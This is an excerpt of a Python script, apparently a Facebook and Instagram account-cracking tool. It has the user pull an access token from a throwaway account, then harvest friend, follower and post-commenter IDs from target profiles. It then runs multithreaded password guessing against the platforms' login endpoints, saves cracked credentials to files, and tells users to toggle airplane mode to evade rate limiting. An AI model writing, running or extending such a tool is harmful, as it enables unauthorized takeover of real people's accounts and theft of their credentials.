...
"""%s
 ...
 - author         : Ali Raza
 - facebook    : https://www.facebook.com/abukalinkcopykarlia
 - fanspage    : https://www.facebook.com/profile.php?id=100074666619670
 - whatsap     : +923347794351
 -                     Most Welcome
 -             Turn on/of Flight Mode
 - version     : 1.1
...
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s token Delete %s'%(M,til,o)),
...
def masuk():
    ...
    rom = raw_input('\n%s [?] Menu : %s'%(P,K))
    if rom in(""):
    	print("%s [!] Token Login Successfull "%(M));exit()
    elif rom in ('1','01'):
        jalan("\n%s [%s!%s] Mandatory use of sacrificial accounts prohibited main account"%(P,M,P))
    	romz = raw_input('%s [?] Token : %s'%(P,K))
        if romz in(""):
        	print("%s [!] Correct contenr kentod "%(M));exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s[√] Login Successfull, Please wait '%(H));jeda(2)
    	...
    	print ("\n%s%s Here's how:"%(H,til));jeda(2)
        print (" - set up account facebook (sacrificial account required)");jeda(2)
        print (" - login account facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
        print (" - url address is mandatory %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
        print (" - copy link : %sview-source:https://business.facebook.com/business_locations"%(O));jeda(2)
        print ("%s - put the link in the facebook address url then click search"%(H));jeda(2)
        print (" - if you have, click the % three dots % in the upper right corner "%(O,H));jeda(2)
        print (" - then click %sSearch on Page%s"%(O,H));jeda(2)
        print (" - type %sEAAG %send the access token will appear."%(O,H));jeda(2)
        print (" - don't forget to copy it\n");jeda(2)
        nanya = raw_input('%s [?] you understand? [%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
        if nanya in(""):
        	print ("%s [!] I asked a question must be answered "%(M));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s [√] congrats you are smart:* "%(H));jeda(2);masuk()
        elif nanya in("n","N"):
        	print ("\n%s [!] you are really stupid "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
...
def publik(romz,headers=header):
    ...
    try:
    	print ("\n%s [%s!%s] Type '%sme%s' if you want to dump your own friend list"%(P,M,P,H,P))
        ...
        for a in z['friends']['data']:
            ...
            print '\r%s [*] Collecting id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes dump id from %s%s'%(P,H,P,H,nm['name']))
        print ('%s [%s√%s] File saved dump:%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
...
def followers(romz,headers=header):
    ...
    try:
    	print ("\n%s [%s!%s] Type '%sme%s' if you want to dump your own followers "%(P,M,P,H,P))
        idt = raw_input(' [*] Target id : %s'%(K))
        ...
        for a in z['data']:
            ...
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes From Dump Id %s%s'%(P,H,P,H,nm['name']))
        print (' %s[%s√%s] Dump File Save :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] Select dump id'%(P))
...
def postingan(romz,headers=header):
    ...
    try:
    	print ("\n%s [%s!%s] Cloning From public Post"%(P,M,P))
        idt = raw_input(' [*] Id post   : %s'%(K))
        simpan = raw_input(' %s[?] Name file : %s'%(P,K))
        ...
        for a in z['data']:
            ...
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes dump Post Id '%(P,H,P))
        print ('%s [%s√%s] File dump Saved :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] fail dump id'%(P))
...
class ngentod:
    ...
    def romiy(self):
        ...
        if unikers in ('Y', 'y'):
            print '\n %s[%s!%s] cth : %s pakistan,786786%s Use , (koma) for the separator '%(P,M,P,H,P)
            while True:
                ...
                if pwx == '':
                    ...
                    def zona(zafi_=None): 
                        ...
                        if ind == '':
                            ...
                            print '\n %s[%s*%s] Account %sOK%s Saved in >%s Total/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] Account %sCP %ssaved in > %sTotal/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s [%s!%s] sEvery crack 1k ID, use airplane mode 2 seconds\n'%(P,M,P);jeda(0.2)
                            ...
                            print '\n%s [%s*%s] Account %sOK%s Saved In >%s Total/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] Account %sCP %sSaved In > %sTotal/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s [%s!%s] sEvery crack 1k ID, Use airplane mode 2 sec\n'%(P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                    ...
                    print '\n%s [ choose the crack method - please try one² ]\n'%(P)
                    print ' [%s01%s] method b-api (crack Fast)'%(K,P)
                    print ' [%s02%s] method mbasic (crack Slow)'%(K,P)
                    print ' [%s03%s] method mobile (crack Very Slow) '%(K,P)
                    zona(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
            print '\n%s [ Choose method crack - please try one² ]\n'%(P)
            print ' [%s01%s] method b-api (crack Fast)'%(K,P)
            print ' [%s02%s] method mbasic (crack Slow)'%(K,P)
            print ' [%s03%s] method mobile (crack Very slow) '%(K,P)
            self.langsung()
    ...
    def langsung(self):
        suuu = raw_input('\n %s[?] method :%s '%(P,K))
        if suuu == '':
            print("%s [!] Correct Content kentod "%(M));self.langsung()
        elif suuu in ('1', '01'):
            print '\n %s[%s*%s] Account%sOK%s Saved in >%s Total/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] Account %sCP %sSaved in > %sTotal/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s!%s] sEvery crack 1k ID, Use Airplane mode For 2 Sec\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
            ...
            print("\n%s [!] Correct Contenr kentod "%(M));self.langsung()
    def b_api(self, user, zona):
        ...
        for pw in zona:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                ...
                open('Total/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
	...
	for pas in pwx:
		...
		try:
			...
			try:
				...
				pass
			with requests.Session() as ses:
				url = "https://www.instagram.com/accounts/login/aliraza.hussaini.12/"
			...
			print ("\r%s[!] No Internet connection"%(M)),
			sys.stdout.flush()
			looping+=1
			pwx = [pw]
			crack2(user, pwx)
...
# CHANGE USER AGENT
def useragent():
	print ("\n%s [%s01%s] Change user agent "%(P,K,P))
	print (" [%s02%s] Check user agent "%(K,P))
	print (" [%s00%s] Return "%(M,P))
	uas()
def uas():
    u = raw_input('\n%s [?] Choose :%s '%(P,K))
    if u == '':
    	...
    	print (" %s[%s*%s] type %sMy user agent%s di browser google chrome\n [%s*%s] to use your own user agent"%(P,K,P,H,P,K,P))
    	print (" [%s*%s] type %sdefault%s to use the built-in user agent tools"%(K,P,H,P))
    	try:
    	    ua = raw_input("%s [?] user agent : %s"%(P,K))
            if ua in(""):
            	print("%s [!] Correct Content kentod "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s [!]  You will be directed to browser "%(H));jeda(2)
            ...
            print ("\n%s [√] Success replace user agent"%(H));jeda(2);menu()
...
def menu():
    ...
    print (' [%s04%s] Crack search name(instagram) '%(K,P))
    print (' [%s05%s] %sStart crack %s'%(K,P,H,P)) 
    print (' [%s06%s] Setting user agent'%(K,P)) 
    print (' [%s07%s] Check Total crack'%(K,P)) 
    #print (' [%s08%s] Follow My Page'%(K,P))
    #print (' [%s09%s] Info script'%(K,P))
    print (' [%s00%s] delete token '%(M,P))
    unik = raw_input('\n%s [?] Menu : %s'%(P,K))
    if unik == '':
        print("%s [!] Correct Content kentod "%(M));jeda(2);menu()
    elif unik in['1','01']:
    	...
    	print "\n%s [01] Total crack Facebook account "%(P)
        print "%s [02] Total crack Instagram account "%(P)
        c = raw_input('\n%s [?] Menu : %s'%(P,K))
    	hasill(c)
    elif unik in['8','08']:
        ...
        jalan('\n%s [√] successfully deleted '%(H));exit()
    else:
        print("%s [!] Correct Content kentod "%(M));jeda(2);menu()
def hasill(c):
	if c in[""]:
		print ("%s[%s!%s] Correct Content kentod"%(P,M,P));exit()
	elif c in["1","01"]:
		try:
			...
			file = raw_input("%s [?] input file : "%(P));jeda(0.2)
			if file == "":
				print("%s [!] file does not exist "%(M))
			total = open("Total/%s"%(file)).read().splitlines()
		...
		print "\n%s [01] Total crack account %sOK "%(P,H)
        print "%s [02] Total crack account %sCP "%(P,K)
        while True:
        	rom = raw_input('\n%s [?] Menu : %s'%(P,K))
		if rom in['1','01']:
			try:
				...
				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
				jalan(" [%s*%s] total account : %s%s"%(K,P,H,str(len(oke))))
				print(" %s[%s*%s] --------------------------------------%s"%(P,K,P,H));jeda(2)
				okek = open("okeh.txt", "r").read()
				print (okek)
				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
			except IOError,KeyError:
				exit (M+"\n [!] No Result awokawokawok")
		elif rom in['2','02']:
			try:
				cepe = open("cepeh.txt", "r").readlines()
				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
				jalan(" [%s*%s] total account : %s%s"%(K,P,K,str(len(cepe))))
				print(" %s[%s*%s] --------------------------------------%s"%(P,K,P,K));jeda(2)
				cepek = open("cepeh.txt", "r").read()
				print (cepek)
				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
			except IOError,KeyError:
				exit (M+"\n [!] No Resuly awokawokawok")
		else:
			exit()
def igg():
	print ("\n%s [%s!%s] Cth name %s: %sAli "%(P,M,P,M,K))
	...
	print '\n%s [%s*%s] account %sOK%s saved in >%s okeh.txt'%(P,K,P,H,P,H);jeda(0.2)
	print '%s [%s*%s] account  %sCP %ssaved in > %scepeh.txt\n'%(P,K,P,K,P,K);jeda(0.2)
	with ThreadPoolExecutor(max_workers=30) as log:
		for ro in mi:
			try:
				_bff_ = []
